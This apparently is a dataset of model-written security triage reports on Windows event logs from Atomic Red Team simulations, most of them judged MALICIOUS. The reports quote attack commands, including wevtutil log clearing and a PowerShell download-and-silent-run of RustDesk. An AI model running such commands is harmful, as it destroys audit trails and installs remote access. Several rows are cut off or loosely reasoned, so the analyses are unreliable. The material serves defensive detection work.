   There are logs indicating modifications to the system time. Tampering with system time can be used to mislead event timestamps, making investigation challenging, or to reset trial periods of software, which increases the level of suspicion.

4. **Frequent Use of `wevtutil` Tool**:
   The `wevtutil` tool is used multiple times, presumably to clear logs. Its invocation by the admin account is another indicator supporting the hypothesis of potential malicious intent.

5. **High Integrity Process Execution**:
   Various commands, including PowerShell, `conhost`, and `whoami`, are run under the `admin_test` account with High Integrity Level. While `whoami` and `conhost` activities alone are not inherently malicious, the context in which they're used (coupled with other findings) could point towards post-exploitation efforts to gather system information.

Overall, the combination of these findings—unauthorized PowerShell script execution, log clearing, time synchronization, and admin account activities—marks this scenario as highly suspicious, if not outright malicious.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately perform a comprehensive audit of all activities associated with the `admin_test` account and any other accounts with elevated privileges.
- Check if there was any legitimate testing being done using Atomic Red Team tools; confirm with the IT or security teams.
- Review and tighten access control policies, audit logs regularly, and employ additional monitoring for similar activities in the future.
- Consider isolating the affected systems to prevent further compromise and analyzing any potential data exfiltration or intrusion scope."
Curl Download File,"### Detailed Analysis of the Logs:

After a thorough review of the provided logs, several indicators suggest potential malicious activity:

#### 1. **Event Log Clearing:**
   - **Security Event 1102:** This event indicates that the security log was cleared. The user responsible is `admin_test`, which is concerning as clearing security logs can be an attempt to cover tracks after potentially malicious activity.
   - **System Events 104:** These events further show that logs for the ""System"" and ""Windows PowerShell"" were cleared by `admin_test`. This behavior is suspicious, as it suggests an intent to hide activities from system administrators or forensic investigators.

#### 2. **Unusual Process Executions:**
   - **Use of `wevtutil.exe`:** In the Sysmon log, there are several instances of `wevtutil.exe` being executed by `admin_test` to clear event logs (as seen in command lines like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application` and similar variations). This tool is commonly used for managing event logs, but in this context, it is clearly being used to erase them, which is suspicious.
   - **Presence of CMD and PowerShell Execution:** Logs show `cmd.exe` and `powershell.exe` running with administrative privileges. It's worth noting these applications can be used legitimately, but they also are frequently used in malicious activities.

#### 3. **Download Activity:**
   - **Suspicious Downloads via `curl.exe`:** There are multiple `curl.exe` executions related to downloading a DLL file from a URL associated with Red Canary's Atomic Red Team. This behavior can be indicative of an attempt to download potentially malicious binaries for testing or deployment on the host.

#### 4. **Execution of `whoami.exe` and `hostname.exe`:**
   - The execution of `whoami.exe` and `hostname.exe` can indicate enumeration activities. They are commonly used to determine account privileges and network hostname, respectively, which could be part of reconnaissance activities within the system.

### Assessment of the Situation:

Based on the logs, several red flags point to a likelihood of malicious intent, especially concerning the use of administrative privileges by the `admin_test` account to clear logs, combined with downloading potentially malicious files. The script executions and the use of `curl` to download files from external URLs further suggest unauthorized actions likely geared towards persistent foothold or data exfiltration.

### Threats or Risks Identified:
- There is a high risk that the host system is compromised. Malicious actors may have administrative access, allowing them to induce further changes or even cause data breaches.
- The download of external executable components such as DLLs could mean the system is at risk of executing injected malicious code, leading to broader network compromise or data theft.

- Conduct a **deep forensic analysis** to identify any further indicators of compromise, focusing on any post-exploitation activities.
- Review and strengthen security policies, particularly around log management and user behavior tracking.
- **Reset and carefully manage access credentials** for the `admin_test` account and ensure stronger authentication measures are in place.

### Final Resolution: 
- **MALICIOUS** - The activities identified appear significantly malicious and suggest a compromise. Immediate response measures are necessary to protect the integrity of both this host and the broader network environment."
Nimgrab - Transfer Files,"### Analysis of Logs

Upon analysis of the provided Windows event logs, several suspicious activities indicate potential malicious behavior:

1. **Clearing of Event Logs**: 
   - The logs show multiple instances of event log clearing using `wevtutil.exe`, as noted in the System, Security, and Sysmon logs. Event IDs 104 (System), 1102 (Security), and corresponding Sysmon logs indicate logs were cleared by the user ""admin_test"".
   - This activity is straightforward evidence of attempts to hide activities, a classic step malware operators use to cover their tracks after executing malicious operations. 

2. **Suspicious Process Execution**:
   - The execution of `cmd.exe` with a command line instruction involving `nimgrab.exe` from a temporary directory and fetching from an external URL raises immediate red flags. This behavior is indicative of download and execute (d&ex) techniques, often seen in malware infection stages.
   - The hashing of `cmd.exe` activity (`SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0`) suggests the potential execution of a payload.

3. **Use of PowerShell**:
   - PowerShell executions (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) associated with this activity, although not detailed in the logs, need to be further examined given PowerShell’s common usage as a tool for script-based attacks.

4. **High Integrity Level Execution**:
   - The execution of these processes at a ""High"" integrity level indicates they were running with elevated privileges, which is concerning when tied to the above behavior patterns.

5. **Atomic Red Team Reference**:
   - The mention of ""Atomic Red Team"" in the command lines suggests the usage of testing scripts or tactics which are often used for red teaming but could also imply a manual or automated attack simulation disguised to emulate legitimate defense testing.

### Assessment

- **Suspicious Activities**: The logs present numerous activities that are consistent indicators of potential unauthorized or malicious activity, such as:
  - Clearing of multiple logs simultaneously.
  - Executing potentially harmful scripts via command line.
  - Download attempts of potential payloads from external sources.

- **Potential Compromise**: While direct evidence of data exfiltration or damage is not available in these logs, the sequence of actions strongly points towards attempts at obfuscation and preparation for further potentially harmful actions.

### Resolution: MALICIOUS

These activities are deemed malicious based on the log clearing, suspicious script executions, and downloads of potentially harmful payloads. Immediate actions should be taken to:

1. **Isolate the Host**: Immediately isolate the affected machine (Server002) from the network to prevent lateral movement or further data loss.
2. **Conduct a Thorough Investigation**: Perform a deeper forensic analysis of the system to identify any additional compromise or persistence mechanisms.
3. **Audit and Harden**: Review access and actions performed by the ""admin_test"" account, and consider revoking privileges until the investigation is complete. Implement stricter logging and monitoring policies to detect similar behavior in the future.
4. **Incident Response**: Engage the Incident Response team to formulate a containment and eradication strategy, followed by lessons learned and hardening based on findings."
File download with finger.exe on Windows,"Upon reviewing the provided event logs from the Windows host, several patterns of activity suggest suspicious behavior that warrants further investigation. Here's a detailed analysis of the findings:

### Suspicious Activities:

1. **Log Clearance Activity**:
   - Multiple instances of the command line utility `wevtutil.exe` being used to clear various logs (Sysmon, Application, System, Security, and Windows PowerShell) are noted:
     - This is seen with `wevtutil.exe` commands such as `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`.
   - Log clearance activities can be indicative of an attempt to cover tracks after unauthorized or malicious activities.

2. **Privilege Escalation and Use of Administrative Privileges**:
   - The user account `admin_test` is notably active with several privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others that are associated with high-risk administrative activities.
   - Event IDs like 4672 and 4624 indicate the use of elevated privileges, typically associated with high-level administrative functions.

3. **Use of Obscure and Uncommon Utilities**:
   - The execution of `finger.exe` with a peculiar command (`finger base64_filedata@localhost`) suggests an attempt to exploit or communicate using encoded data, possibly as part of data exfiltration or internal reconnaissance.
   - The use of `cmd.exe` and `whoami.exe` suggests attempts to gather further system information, possibly to evaluate privilege levels or system configuration after gaining access.

4. **Process Activity from Suspicious Directories**:
   - Numerous `conhost.exe` activities associated with `wevtutil.exe` and `cmd.exe` are noted. `conhost.exe` should operate from expected directories and its excessive spawning is unusual.
   - A command executed through `cmd.exe` using `finger` indicates potential misuse.

5. **Time Manipulation**:
   - There are entries indicating time changes (`Kernel-General` events), which might be an attempt to manipulate timestamps to obscure activity chronology.

### Indicators of Potential Compromise:

- **Event Logs Clearance**: Frequent clearing of event logs is a red flag in incident response, as it often signifies attempts to remove traces of unauthorized activity.
- **High-Level Privileges**: The use of systemic privileges in conjunction with time-altering commands and process executions might indicate privilege escalation.
- **Suspicious Process Execution**: Execution patterns involving process utilities (like `whoami`, `cmd`, `finger`) from unexpected contexts highlight potential illegitimate access or script execution by an intruder.

### Conclusion and Resolution:
The activities observed in the event logs are strongly indicative of malicious behavior, particularly considering the pattern of log clearance, privilege escalation, and utilization of `wevtutil.exe` in a manner consistent with attempting to hide traces of unauthorized access. The use of obscure utilities for potential data exfiltration or reconnaissance strengthens the analysis.

Arbitrary file download using the Notepad++ GUP.exe binary,"Upon analyzing the provided Windows event logs, several key activities stand out that are potentially indicative of malicious behavior or compromise:


### 1. Log Clearing Activities

- **System & Security Log Cleared:**
  - There are multiple events indicating that logs have been cleared. Event IDs 104 in the System log and Event ID 1102 in the Security log both show log clearing actions. The user associated with these activities is `admin_test`.
  - Log clearing is a definite red flag, as attackers often clear logs to cover their tracks after conducting malicious activities. This action was performed by a user `admin_test`, which could imply insider threat or compromised credentials.

### 2. Wevtutil Usage

- **Frequent Execution of `wevtutil.exe`:**
  - The logs show multiple executions of the `wevtutil.exe` tool, which is used for managing event logs, including clearing them. This was executed under the user `SERVER002\admin_test` with high integrity levels, consistent with the actions of a user trying to clear logs after performing some activities.

### 3. Unusual Command Execution

- **Suspicious CMD Execution:**
  - There’s a command line execution recorded that involves creating directories and handling files (`cmd.exe` with `GUP.exe -unzipTo`). This was executed in a temp directory associated with Atomic Red Team, which is a red teaming toolset often used for simulating adversary behavior. This suggests a possible legitimate security test if coordinated with IT, but if not, it might indicate an unauthorized attempt to execute or stage malware.
  - The involvement of a download from an external URL suggests potential data exfiltration or staging files for further attacks.

### 4. Execution of PowerShell with High Privileges

- **PowerShell in Use:**
  - PowerShell is recorded being executed, which, if not part of standard administrative tasks, can be a platform for executing scripts or commands that may be malicious.

### 5. Execution of System Tools

- **Use of Tools Like `whoami.exe` and `HOSTNAME.EXE`:**

ScreenConnect Application Download and Install on Windows,"Upon analyzing the Windows event logs, there are several key observations that indicate potentially malicious activity.

1. **Suspicious Installation Activity**: 
   - There is an MSI installation of ScreenConnect (`ScreenConnect.msi`) initiated from a download location `C:\\Users\\admin_test\\Downloads`. ScreenConnect is a legitimate tool used for remote desktop services, but it can be misused for unauthorized remote access.
   - The installation is executed through a PowerShell command that downloads it from a cloudfront.net URL, indicating the use of PowerShell for potentially downloading and executing a remote access tool.

2. **PowerShell Activity**: 
   - There is a PowerShell script that performs a web request to download the ScreenConnect MSI file and installs it silently using the `msiexec /i` command with the `/qn` switch, meaning no user interface is shown. This silent installation is commonly associated with attempts to avoid user detection.

3. **Log Clearing**:
   - Multiple logs have been cleared, including System and Security logs (`EventID 104` and `EventID 1102`), which is a common tactic employed by attackers to cover their tracks and remove evidence of malicious activity.

4. **Event Log Activities**:
   - The `wevtutil.exe` command is used multiple times to clear the Application, System, and Security logs. This activity is performed under the user `SERVER002\\admin_test`, which matches with the same user involved in the suspicious download and installation activity.

5. **Integrity Level**:
   - The activities run at a high integrity level, increasing the potential impact of the installation and system changes.

These points collectively indicate that there is ongoing unauthorized activity on the system, potentially aimed at installing remote access software covertly, with attempts to cover up tracks by clearing logs.

### Final Assessment: MALICIOUS

Based on the above analysis, the behavior observed in the logs strongly indicates a compromise involving the unauthorized installation of remote access software and subsequent log tampering activities. This assessment leads to conclude that the activity is **MALICIOUS**.

By taking these actions, the immediate and root threats can be addressed, minimizing potential damage and improving the organization’s security posture."
Lolbas replace.exe use to copy file,"**Analysis of the Logs**

1. **Repeated Execution of ""wevtutil.exe""**: The logs show multiple invocations of the ""wevtutil.exe"" utility. This tool is typically used to manage Windows Event Logs, and a common use in malicious scenarios is to clear logs (using the ""cl"" command) to cover tracks. The sequential commands targeting different logs (""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"") suggest attempts to clear or manipulate these logs.

2. **Usage of High Integrity Level Processes**: Many processes in the log are running with high integrity levels under the ""admin_test"" user, suggesting they could be performing tasks with administrative privileges. This alone isn't suspicious, but it does mean these processes have the capability to perform significant changes to the system.

3. **Multiple Log Clearing Events Detected**: The Security and System logs both reflect entries indicating that logs have been cleared (Event ID 1102 for Security and 104 for System and PowerShell). These actions are executed by the ""admin_test"" account, which is a clear indication of an attempt to cover up actions taken on the system.

4. **CMD Operations with Potentially Suspicious File Manipulation**: One of the processes involves ""cmd.exe"" executing a command that deletes specific files and then replaces them using ""replace.exe"". This could be a valid administrative action but is unusual and in the context of other findings could be indicative of tampering.

5. **Presence of Tools and Parent Process Context**: The operations and sequences imply that processes parented by ""wsmprovhost.exe"" with a command line indicating administrative task automation (possible remote management) executed under an elevated context (admin_test) perform potentially suspicious actions.

6. **Concerning Patterns Around ""Redistribution"" Tools**: The Atomic Red Team reference in logs suggests a potential simulation tool or script was used which might relate to security tests or training that can still bear risks if unaccounted for in security models.

**Assessment of the Situation**

A combination of factors in this scenario leads to a strong suspicion of potentially malicious activities:

- The clearing of logs via wevtutil.exe to potentially hide tracks.
- The integrity level of operations being high, suggesting systemic level changes.
- Log entries indicating logs have been explicitly cleared, particularly from security logs without a benign purpose such as regular maintenance or updates logged elsewhere.
- Command lines and file manipulations executed under privileged accounts indicate patterns not aligning with normal audit or maintenance tasks.

**Threat and Risk Identification**

- **Threat Level**: High. The log-clearing activities, if unsolicited, suggest attempts at removing traces of other potential malicious actions.
- **Risk**: Complete compromise of system integrity and traceability, leading to potential undetected malicious activity or breach.

**Guidance on How to Proceed**

- **Resolution**: **MALICIOUS**

Immediate actions should include:
1. **Isolate the Host**: Remove the affected host from the network to prevent further spread or data exfiltration if malicious activities are ongoing.
2. **Conduct Full Forensic Investigation**: Analyze all related logs, including re-acquiring those that appear deleted due to log clearing, if possible.
3. **Identify the Scope of Impact**: Determine the extent of access and changes made by the attacker using forensic tools.
4. **Alert Incident Response Team**: Rapid response needed from the cybersecurity team to manage and mitigate risks.
5. **Secure and Review Permissions**: Ensure that administrative privileges are verified against known users and realign any discrepancies.
6. **Patch and Fortify Systems**: Ensure systems are updated and any identified vulnerabilities patched, with improved logging and alerting for future activities.

This assessment concludes that proactive security actions are mandatory to secure the company’s assets and integrity from any undetected ongoing malicious threats."
portproxy reg key,"After examining the provided logs, several factors stand out as indicators of suspicious or potentially malicious activity:

1. **Registry Changes through PowerShell**:
    - There are multiple instances in the PowerShell logs showing commands that suggest the use of `netsh` to create a port proxy. This can be used to redirect traffic on the localhost and might be utilized by malware or attackers to redirect local connections potentially for persistence or data exfiltration.
    - PowerShell is known to be leveraged by attackers for its robust scripting capabilities, which enable nearly any action on a Windows machine without needing to leverage separate binaries.

2. **Event Log Clearing**:
    - The Security log indicates Event ID 1102, which marks that the security log has been cleared. This action is often performed by attackers to cover their tracks after compromising a machine. In a legitimate scenario, log clearing should coincide with a justified administrative task.
    - There are also entries indicating the system and Windows PowerShell logs were cleared. This further suggests an attempt to conceal activity on the system.

3. **Process and Command Line Activity**:
    - The Sysmon logs show a high level of activity involving `wevtutil.exe`, which is used for event log management. Combined with the cleared event logs, this activity is suspicious.
    - The processes `netsh.exe` and `powershell.exe` with specific arguments for forwarding ports stand out as they are not common operations unless configured purposely on a server for legitimate reasons (such as load balancing or specific service configurations).
    - The use of `whoami.exe` within the same context can be considered as reconnaissance activity to determine the current user context.

4. **Integrity and User Context**:
    - The user `admin_test` appears to have a high integrity level and is responsible for most of the activities mentioned. The persistent pattern of administrative commands and log clearings under this account are suspicious.

**Assessment**:
The combination of these factors indicates a likely intrusion or malicious behavior:
- The use of PowerShell for port proxying.
- The clearing of multiple log types in close temporal proximity.
- Administrative commands executed that impact system integrity without clear legitimate context.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediate containment is required. Disconnect the affected system from the network if not already isolated.
- Conduct a thorough forensic investigation on `Server002` to understand the scope of the compromise.
- Review access logs and network traffic to identify any lateral movement or data exfiltration.
- Consider resetting credentials, particularly for `admin_test`, and enforce stronger security protocols such as MFA.
- Remediate any vulnerabilities exploited by adversaries and apply patches across systems.
- Engage with incident response teams to ensure all aspects of the breach are managed effectively."
Download a file with Microsoft Connection Manager Auto-Download,"**Analysis Summary:**

Upon reviewing the provided logs, there are several indicators of potentially suspicious or malicious activities that warrant further investigation.

**Suspicious or Anomalous Behavior:**

1. **Frequent Use of `wevtutil.exe`:** Multiple instances of `wevtutil.exe` being executed with the `cl` (clear) command across different logs (`Microsoft-Windows-Sysmon` and `System`), indicating attempts to clear various event logs: Sysmon, Application, and System logs. This is often used to cover tracks after conducting illicit activities.

2. **Clearing Security Logs:** The `Security` log is cleared, as evidenced by Event ID 1102. Again, this action is characteristic of someone trying to hide malicious activity by removing evidence.

3. **Privileged Account Usage:** The account `SERVER002\\admin_test` with high integrity level privileges is repeatedly seen executing sensitive commands, such as `wevtutil.exe`, which suggest potential abuse of privileges.

4. **Execution of Suspicious Batch File:** The execution of `cmd.exe` with a command to run a batch file located in a temporary path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1105\\src\\T1105.bat` suggests execution of potentially harmful or testing payloads. Atomic Red Team tests are known simulated adversary techniques, but if found in a production environment without authorization, could be indicative of malicious activity or an internal testing mishap.

5. **Edge Update Activities:** Continuous activities involving `MicrosoftEdgeUpdate.exe` at the System level could typically be benign as part of software updates.

RustDesk Files Detected Test on Windows,"Upon analyzing the provided logs across various categories (System log, Security log, Application log, Sysmon log, and PowerShell log), the following suspicious activities have been identified:

1. **System Log Clearing**: There are multiple instances of system logs being cleared shortly after a certain PowerShell script execution, suggesting an attempt to cover up tracks. Such behavior is consistent with post-exploitation techniques to hide malicious activities. (Event ID: 104)

2. **EDR Alert on CEO Machine**: The logs contain activities typical of adversarial tactics, including execution of scripts and commands that are highly suggestive of malicious intent, particularly the PowerShell command that invokes a web request to download and execute `rustdesk-1.2.3-1-x86_64.exe` from a public GitHub repository. This is highlighted in the Sysmon events and is concerning given that unauthorized software is being downloaded and executed (`ProcessId: 5320`).

3. **Use of PowerShell**: The observed PowerShell command (`powershell.exe & {$file = Join-Path $env:USERPROFILE \""Desktop\\rustdesk-1.2.3-1-x86_64.exe\"" Invoke-WebRequest -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe Start-Process -FilePath $file \""/S\""}`) is designed to download and run an executable. This behavior is typically suspicious especially when it is involving downloading an executable from a less controlled environment like GitHub.

4. **Sysmon Logs**:
   - Process creation related to `rustdesk.exe`, a remote desktop software, might imply a potential unauthorized remote access setup (`ProcessId: 6524`).
   - Execution of whoami, hostname, and task-killing operations associated with `rustdesk` deployment seem to identify itself and kill potential conflicting processes.
   - Multiple uses of `wevtutil.exe` to clear logs from the Windows Event Viewer (System Logs, Security Logs, etc.) is suspicious, flags an intentional intention to hide action trails on the system.

5. **Security Log**:
   - Multiple privilege escalation activities logged (`EventID: 4672`) which could indicate an attempt to gain full administrative access and leverage more control over system resources.

### Assessment
Given the presence of unauthorized downloads and installations of a remote desktop client, log clearing events, and suspicious command executions via PowerShell, there are strong indicators of a potential compromise on the CEO's machine.

While further investigation might be needed to confirm exact details and potentially broader network implications, the activities present a serious security risk due to possible unauthorized access and system tampering.

### Guidance
- Immediately disconnect the affected system from the network to prevent further spread or exfiltration.
- Conduct thorough internal network monitoring to identify any other indicators of compromise.
- Engage in a comprehensive forensic analysis on the affected system to understand the full scope of compromise.
- Consider deploying additional security measures such as network segmentation, enhanced logging, and user behavior analytics to detect future anomalies.

### Resolution
- **MALICIOUS**: The logs contain activity that strongly suggests malicious intent and action aimed at compromising the security and integrity of the system."
Embedded Script in Image Execution via Extract-Invoke-PSImage,"## Detailed Analysis of the Logs

### Suspicious or Anomalous Behavior in the Logs

1. **Log Clearing Activity:**
   - In the security and system logs, we see logs being cleared with the user ""admin_test"" using the `wevtutil.exe` command. This type of activity is often associated with an attempt to hide malicious actions. The relevant events are:
     - EventID 1102 in the security log indicates the security log was cleared.
     - EventID 104 in the system log indicates the system and Windows PowerShell logs were cleared.

2. **PowerShell Activity:**
   - The PowerShell logs show the execution of scripts using `PowerShell.exe` to run modules like `Extract-Invoke-PSImage.ps1`. This script appears to extract and run a decoded script from an image file named `evil_kitten.jpg` located in a temporary directory. Such activity is suspicious as it aligns with techniques used to hide malware in image files (steganography).
   
3. **Sysmon Logs:**
   - There are multiple executions of `conhost.exe` and `wevtutil.exe` as observed in the Sysmon logs. While `conhost.exe` execution is often part of standard Windows operation, `wevtutil.exe` was used in conjunction with log clearing, which is more suspect. 
   - The PowerShell process ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" shows suspicious activity associated with the command line importing modules to extract a PowerShell script from an image file.

### Indicators of Malicious Activity

- **Use of `wevtutil.exe` by User ""admin_test"":**
  - The execution of `wevtutil.exe` to clear logs is a strong indication of attempts to cover malicious tracks.
  
- **PowerShell Script Execution:**
  - The command sequences in the PowerShell logs suggest an operation that extracts and runs potentially harmful scripts concealed within an image file. This matches known attack patterns that use image files as a medium for transporting malicious code.

### Assessment and Risk

- It is clear from the logs that there are multiple activities indicative of a compromise. The pattern of log clearing combined with the execution of potentially harmful PowerShell scripts via image files suggests unauthorized and malicious actions by or with the credential of the ""admin_test"" user on `Server002`.

### Guidance and Resolution

- **Immediate Actions:**
  - **Isolate the Affected Machine:** Sever its connection to prevent further actions by the adversary or potential spread of the threat.
  - **Thoroughly Investigate User Activities:** Audit activities for the user ""admin_test"" to confirm unauthorized access or misuse of privileges.
  - **Review and Improve Security Policies:** Review logging, PowerShell execution policies, and user permissions to prevent recurrence.

- **Resolution: MALICIOUS**
  - The combination of log clearing, aggressive use of PowerShell, and the activity attempting to hide scripts within an image all represent a high-confidence indicator of a malicious incident."
Download a file using wscript,"**Analysis of the Windows Event Logs:**

Upon reviewing the provided logs, several suspicious activities stand out that suggest potential malicious behavior on the host, ""Server002"". The key indicators include:

1. **Log Clearance**:
   - The logs contain multiple entry events indicating log files were cleared. Specifically, event IDs 104 in the ""System"" log indicate the System and Windows PowerShell logs were cleared by the user ""admin_test"".
   - Additionally, event ID 1102 in the ""Security"" log shows that the security logs were also cleared by the same user. Clearing logs is a common method used by attackers to cover their tracks after conducting malicious activities.

2. **Process Execution Patterns**:
   - The ""Sysmon"" log events show several instances of ""wevtutil.exe"" being used with the `cl` command to clear logs from various channels (e.g., Sysmon, Security, Windows PowerShell).
   - The frequent execution of ""wevtutil.exe"" by ""admin_test"" with a high integrity level suggests unauthorized or suspicious behavior aimed at disrupting evidence logging.

3. **Unusual PowerShell and Command Line Activity**:
   - There is a pattern of `cmd.exe` and `wscript.exe` in conjunction with PowerShell, as evidenced by an attempt to execute a VBScript located in a potentially suspicious directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1105\src\T1105-download-file.vbs`). This script execution could be part of an attack simulation, testing, or actual exploitation framework like the Atomic Red Team, indicating potential misuse for malicious intents.
   
4. **Unusual and Abnormal Behavior**:
   - The series of Microsoft Edge update and registration activities logged might be benign in isolation but, combined with the log clearance and potential script execution, could indicate an attempt to use legitimate processes for evasive tactics or privilege escalation.

**Assessment of the Situation:**
Based on the above findings, there is substantial evidence to support the conclusion of suspicious activity which might be indicative of a compromise. The clearing of system, security, and application logs alongside the use of known offensive simulation frameworks (e.g., Atomic Red Team) suggests unauthorized access and possible malicious execution.

**Threats and Risks Identified:**
- There is a risk of unauthorized access to the system.
- Potentially malicious activities and scripts could have been executed.
- Log clearance is an indicator of an attempt to hide traces of illicit activities.

**Guidance on How to Proceed:**
1. Immediately isolate the affected system (“Server002”) from the network to contain any potential spread of malicious activity.
2. Conduct a full forensic investigation on the machine to capture volatile memory and disk images for a detailed analysis.
3. Review and adjust access permissions and audit the login history for the ""admin_test"" account.
4. Use endpoint detection and response tools to scan for known threat indicators in the cleared logs.
5. Alert the incident response team to assess the scope and impact of the potential breach, and escalate as necessary.
6. Strengthen logging mechanisms, ensuring they are persistent and securely stored to prevent future unauthorized clearances.

**Final Resolution:** **MALICIOUS** - The activities logged are indicative of a deliberate attempt to execute unauthorized and potentially harmful actions on the system, coupled with efforts to erase logs to cover tracks."
Malicious User Agents - CMD,"Upon analyzing the provided Windows event logs, several key actions and events point towards potential malicious activities:

1. **Security Log Clearance (Event ID 1102)**:
   - The log entry indicates that the security log on the system (""Server002"") was cleared by the user ""admin_test"". This action is suspicious as log clearing can be indicative of an attempt to cover up malicious activities on the system.

2. **System and Windows PowerShell Log Clearance (Event ID 104)**:
   - The system log and Windows PowerShell log were both cleared by the same user ""admin_test"". Clearing multiple logs, especially within a short timeframe, compounds the suspicion of an attempt to hide activities.

3. **Sysmon Log Analysis**:
   - The execution of `wevtutil.exe` to clear logs from different channels such as Security, System, Application, and Windows PowerShell is confirmed by multiple Sysmon Event ID 1 entries. These actions are highly concerning as they confirm deliberate log tampering.
   - Execution of suspicious PowerShell commands and use of `cmd.exe` with several `curl.exe` commands aiming to contact the external site `www.google.com` using varying user-agent strings. This activity aligns with techniques used to mask outbound network communications and assess internet connectivity stealthily.

4. **Process Execution Context**:
   - Actions were performed by the user ""SERVER002\\admin_test"" with a high integrity level. The use of legitimate and system-native tools like `wevtutil.exe`, `curl.exe`, and command execution through `cmd.exe` in a scripting pattern indicates a potentially sophisticated actor leveraging built-in tools for malicious purposes.
   - The appearance of both `conhost.exe` and `wsmprovhost.exe` in relation to cleared logs suggests scripted operations and potential malicious use, directly involving systems management frameworks.

### Assessment:
The activities recorded in the logs strongly suggest malicious intent. Clearing logs, especially in this coordinated and comprehensive manner, is a common tactic employed by attackers to eliminate traces of their activities. The combination of cleared logs and the execution patterns observed indicates an effort to execute and then hide potentially malicious operations on the host.

### Resolution:
- **MALICIOUS**: The logs provide clear evidence of activities consistent with malicious intent, including log tampering and potential network reconnaissance or data exfiltration attempts.

### Guidance:
- Immediate action should be taken to isolate the affected host (""Server002"") from the network to prevent further potential malicious actions.
- Conduct a comprehensive forensic investigation to identify the scope of the compromise, including potential data leakage or persistence mechanisms established by the threat actor.
- Assess all credentials and systems that may have been accessed or impacted, considering revocation and reissuance where appropriate.
- It is highly recommended to run a full malware scan and integrity check to ensure no additional compromise or malware is present."
Windows - PowerShell Download,"After analyzing the provided Windows event logs, here's a detailed assessment:

### Suspicious or Anomalous Behavior:

1. **Log File Clearing**:
   - In the Security and System logs, there are events indicating that logs were cleared (`EventID: 1102` in Security and `EventID: 104` in System). This is often a significant indicator of malicious behavior, as attackers may clear logs to cover their tracks.

2. **PowerShell Activity**:
   - A PowerShell command (`powershell.exe`) was executed that downloads a file from a GitHub URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt`). Although downloading a license file may seem benign, the use of PowerShell to download files can be a tactic for downloading malicious payloads.

3. **Use of `wevtutil`**:
   - Multiple instances of the `wevtutil.exe` command-line utility (`Microsoft-Windows-Sysmon EventID: 1`) were detected, which is used for event log management. Specifically, commands like `""wevtutil.exe"" cl Security` indicate that log clearing operations were executed by the `admin_test` account.

4. **Execution of Reconnaissance Tools**:
   - Execution of tools like `whoami.exe` and `hostname.exe` suggest potential reconnaissance activity within the environment, which can be a step during a compromise.

### Malicious Activity or Indicators of Compromise:

1. **Log Clearing as a Cover-Up**:
   - The log clearing operations are highly suspicious, especially when tied with other activities like unusual command-line executions and PowerShell usage. This is often associated with malicious actors attempting to obfuscate their activities.

2. **Use of PowerShell for File Download**:
   - Leveraging PowerShell to download files over the internet is a known technique used in various attack scenarios, including initial access and payload delivery.

### Guidance and Resolution:

Based on the above analysis, I would classify this activity as **MALICIOUS**. The combination of unauthorized log clearing, potentially suspicious PowerShell file downloads, and execution of utilities associated with evasion and reconnaissance, strongly indicate a potential compromise of the system. 

### Recommended Actions:

1. **Immediate Containment**:
   - Isolate the affected system (Server002) from the network to prevent any further potential spread of compromise.

2. **Perform a Detailed Forensic Analysis**:
   - Investigate for any additional Indicators of Compromise (IoCs) on Server002, including potential persistence mechanisms or other malicious payloads.

3. **Review User Activity**:
   - Verify the legitimacy of the `admin_test` account’s activities and investigate any anomalies in access patterns or login attempts.

4. **Patch and Harden the System**:
   - Ensure all security patches are applied and strengthen PowerShell execution policies.
   - Review and tighten access controls for log manipulation utilities.

5. **Threat Hunt in the Environment**:

DNS over HTTPS Long Domain Query,"### Analysis of Logs

Upon analyzing the logs provided, there are several points of concern that can be associated with potentially suspicious activity:

1. **Event Log Clearing**:
   - **Security Log (Event ID 1102) and System Log (Event ID 104)**: 
     - These events indicate that logs have been cleared by a user named `admin_test` from `SERVER002`. Frequent or unexplained clearing of event logs is a common indicator of malicious behavior, as attackers often clear logs to hide their tracks.
   - The `wevtutil.exe` command-line entries from the `Sysmon` logs show that the `wevtutil.exe` command was used to clear the security, system, and PowerShell logs. This reinforces the suspicion raised by the event logs being cleared.

2. **Execution of PowerShell Script**:
   - The specific PowerShell script executed, `T1572-doh-domain-length.ps1`, is located under a directory that suggests it originates from the Atomic Red Team test collection. While Atomic Red Team scripts are used for simulation purposes, their presence could indicate that a test was being conducted or it might be used for malfeasance.
   - The command executed with PowerShell accesses the DoH server (https://8.8.8.8/resolve), which might be suspicious if not conducted as part of an authorized simulation.

3. **Time Changes**:
   - There are minor time adjustments recorded by the `svchost.exe` process (Event ID 4616), though time changes alone without a suspicious context are not inherently malicious. They could indicate an attempt to disrupt logging accuracy.

### Risks and Threats Identified

- **Inconsistent and unexplained event log clearing**: Often a clear indicator of malicious activity trying to cover tracks.
- **Presence and execution of potentially dangerous PowerShell script**: If not part of a known and legal test, it could signal an execution of potentially harmful operations.
- **Use of administrative accounts (admin_test)**: Suspicious activity linked to this user account needs to be verified and matched against any legitimate administrative actions or test activities.

### Guidance on How to Proceed

1. **Immediate Actions**:
   - Confirm whether the clearing of logs and execution of PowerShell script were part of legitimate operational security tests or compliance operations.
   - Verify with the `admin_test` user or account management logs for recent activity orders and intentions.
   - Conduct a thorough audit of other security settings to ensure no backdoors or unauthorized access points were established.
   
2. **Further Investigation**:
   - Investigation should pivot towards auditing other systems for similar patterns of log deletion or unauthorized script execution.
   - Review network logs during the time of activity for any unusual or suspicious outbound connections.

3. **Prevention and Education**:
   - If legitimate testing was taking place, ensure all tests are documented and communicated properly to avoid feat and misinterpretation of logs.
   - Enhance monitoring controls to flag unauthorized log clearance activities more promptly and create SOPs for investigation.

### Final Assessment

